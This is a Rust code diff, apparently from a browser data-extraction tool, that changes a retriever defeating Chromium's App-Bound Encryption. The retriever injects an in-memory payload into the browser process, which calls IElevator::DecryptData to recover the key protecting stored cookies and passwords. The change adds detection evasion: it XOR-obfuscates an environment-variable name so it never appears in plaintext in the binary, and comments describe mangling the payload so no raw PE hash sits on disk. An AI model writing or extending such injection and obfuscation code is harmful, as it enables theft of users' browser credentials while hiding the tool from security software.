@@ -25,8 +25,9 @@ const APPB_PREFIX: &[u8] = b"APPB";
 
 /// Env var carrying the base64 APPB ciphertext to the injected payload
 /// (mirrors Go's `HBD_ABE_ENC_B64` — the payload calls
-/// `IElevator::DecryptData` on it and publishes the key).
-const ABE_ENC_ENV: &str = "HBD_ABE_ENC_B64";
+/// `IElevator::DecryptData` on it and publishes the key). Materialized at
+/// runtime via `bypass::x!` so the name never lands plaintext in the image.
+const ABE_ENC_ENV_KEY: u8 = 0x77;
 
 /// Mirrors the `Local State` slice Chromium's v20 retriever reads.
 #[derive(Debug, Deserialize, Default)]
@@ -69,12 +70,13 @@ impl Retriever for AbeRetriever {
         })?;
 
         let enc_b64 = STANDARD.encode(&blob);
-        let env: &[(&str, &[u8])] = &[(ABE_ENC_ENV, enc_b64.as_bytes())];
+        let env_key = bypass::x!("HBD_ABE_ENC_B64", ABE_ENC_ENV_KEY);
+        let env: Vec<(&str, &[u8])> = vec![(&env_key, enc_b64.as_bytes())];
         // Materialized from the const-mangled blob (`bypass::entropy`) so the
         // on-disk image carries no raw PE hash; the real payload exists only
         // in memory here, just before injection.
         let payload = bypass::entropy::materialize();
-        let key = abi::inject(&exe_path, &payload, env).map_err(|e| {
+        let key = abi::inject(&exe_path, &payload, &env).map_err(|e| {
             RetrieverError::Retriever(format!("inject {}: {e}", hints.windows_abe_key))
         })?;
         Ok(Some(key.to_vec()))
